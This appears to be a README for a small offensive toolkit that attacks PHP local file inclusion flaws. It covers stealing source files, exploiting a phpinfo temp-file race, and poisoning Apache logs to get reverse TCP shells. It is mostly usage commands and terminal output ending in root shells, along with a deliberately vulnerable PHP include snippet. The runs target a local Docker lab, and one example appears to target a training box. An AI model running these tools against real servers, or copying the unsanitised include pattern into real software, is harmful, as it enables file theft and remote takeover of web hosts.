# lfi-loot

## Summary

This loot files from a php application that has an LFI vuln.

```sh
⬢  lfi  ./lfi-loot.py

lfi-loot [ mikael.kall@kindredgroup.com]
This tool loot files from a php application that has an LFI vuln.

usage: lfi-loot <options>
       -f: filename
       -g: get parameter
       -u: url
example: lfi-loot.py -f index.php -g file -u http://localhost:8080

⬢  lfi  ./lfi-loot.py -f index.php -g file -u http://localhost:8080
✔ Looted ./.loot/index.php from http://localhost:8080
⬢  lfi  cat ./.loot/index.php
<?php
    // This is a LFI vuln
    $file = $_GET['file'];
    if(isset($file))
    {
        include("$file");
    }
    else
    {
        include("home.php");
    }
?>
```


# phpinfo_lfi.py

## Summary

PHP store temporary uploaded files during processing. A race condition is possible if you abuse a lfi
to get a reverse_tcp


```sh
  lfi  ./phpinfo_lfi.py

█ ▄▄   ▄  █ █ ▄▄  ▄█    ▄   ▄████  ████▄ █    ▄████  ▄█
█   █ █   █ █   █ ██     █  █▀   ▀ █   █ █    █▀   ▀ ██
█▀▀▀  ██▀▀█ █▀▀▀  ██ ██   █ █▀▀    █   █ █    █▀▀    ██
█     █   █ █     ▐█ █ █  █ █      ▀████ ███▄ █      ▐█
 █       █   █     ▐ █  █ █  █               ▀ █      ▐
  ▀     ▀     ▀      █   ██   ▀                 ▀

[mikael.kall@kindredgroup.com]

Usage: ./phpinfo_lfi.py <URL> <LFI> <LHOST> <LPORT> [threads]

EXAMPLE: ./phpinfo_lfi.py 'http://127.0.0.1:8080/phpinfo.php' 'index.php?file=' 127.0.0.1 1337 300

⬢  lfi  ./phpinfo_lfi.py 'http://127.0.0.1:8080/info.php' 'index.php?file=' 127.0.0.1 1337 300
Getting initial offset... found [tmp_name] at 121644
Spawning worker pool (300)...
[+] Netcat port: 1337
Connection from 127.0.0.1:50232
# id
uid=0(root) gid=0(root) groups=0(root)
```

# lfi_poison

## Summary

Poisons logfile and use LFI to get a reverse tcp shell.

## Usage

Start docker container with lfi-php5 if you want to test this locally

```sh
 phpinfo_lfi  master ⦿ docker-compose build
Building lfi-php5
Step 1/9 : FROM tutum/apache-php
 ---> 2e233ad9329b
Step 2/9 : MAINTAINER Mikael Kall <kall.micke@gmail.com>
 ---> Using cache
 ---> 25df34b016d9
Step 3/9 : EXPOSE 80
 ---> Using cache
 ---> bb6176966e6f
Step 4/9 : ADD app/index.php /app/index.php
 ---> Using cache
 ---> 222c78d23b2f
Step 5/9 : ADD app/info.php /app/info.php
 ---> Using cache
 ---> 07abc827cc67
Step 6/9 : ADD app/home.php /app/home.php
 ---> Using cache
 ---> c1198fcf4d25
Step 7/9 : ADD app/troll.jpg /app/troll.jpg
 ---> Using cache
 ---> 54f3e46a68f8
Step 8/9 : ADD app/php.ini /etc/php5/apache2/php.ini
 ---> Using cache
 ---> cd070e65988c
Step 9/9 : ADD app/php.ini /etc/php5/cli/php.ini
 ---> Using cache
 ---> 2582f28e67db
Successfully built 2582f28e67db
Successfully tagged phpinfolfi_lfi-php5:latest

⬢  phpinfo_lfi  master ⦿ docker-compose up -d
Creating network "phpinfolfi_default" with the default driver
Creating phpinfolfi_lfi-php5_1 ... done
```

Verify that container is running.

```sh
phpinfo_lfi  master ⦿ docker ps
CONTAINER ID        IMAGE                 COMMAND             CREATED             STATUS              PORTS                  NAMES
54fc510cedde        phpinfolfi_lfi-php5   "/run.sh"           18 seconds ago      Up 17 seconds       0.0.0.0:8080->80/tcp   phpinfolfi_lfi-php5_1
```

Run ./lfi_poison.py to get the usage menu.

```sh
⬢  lfi_poison  master ⦿ ./lfi_poison.py
 ██▓      █████▒██▓ ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █
▓██▒    ▓██   ▒▓██▒▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █
▒██░    ▒████ ░▒██▒▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒
▒██░    ░▓█▒  ░░██░▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒
░██████▒░▒█░   ░██░▒██▒ ░  ░░ ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░   ▓██░
░ ▒░▓  ░ ▒ ░   ░▓  ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒
░ ░ ▒  ░ ░      ▒ ░░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░ ░    ░ ░    ▒ ░░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░
    ░  ░        ░               ░ ░   ░        ░      ░ ░           ░
[nighter@nighter.se]

Usage: ./lfi_poison.py <URL> <LHOST> <LPORT>

EXAMPLE: ./lfi_posion.py 'http://10.10.10.70/index.php?file=/var/log/apache2/access_log' 10.10.14.24 1337
```        

Run the exploit.

```sh
⬢  lfi_poison  master ⦿ ./lfi_poison.py 'http://127.0.0.1:8080/index.php?file=/var/log/apache2/access_log' 192.168.1.81 4444
[+] LHOST = 192.168.1.81
[+] LPORT = 4444
[+] Poison
[+] Shell listen
[+] Exploit
root@e19e5b3d2c60:/var/log/apache2# id
uid=0(root) gid=0(root) groups=0(root)
```
